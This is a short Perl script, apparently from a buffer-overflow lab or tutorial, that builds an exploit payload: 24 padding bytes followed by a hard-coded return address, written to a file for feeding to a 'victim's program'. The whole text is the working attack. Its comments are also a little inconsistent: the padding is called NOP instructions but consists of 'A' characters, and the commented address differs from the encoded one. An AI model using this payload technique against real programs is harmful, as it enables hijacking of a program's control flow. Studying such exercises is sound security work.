# This address must match the buffer variable of the victim's program */
my $retaddr = "\x66\x84\x04\x08"; #0xbffff218

# Fill NOP instruction
my $pad = "A" x 24;

# Input string to our victim's program
my $arg = $pad.$retaddr;

# Let us store the input string to a file
open OUT, "> payload";
print OUT $arg;
close OUT;
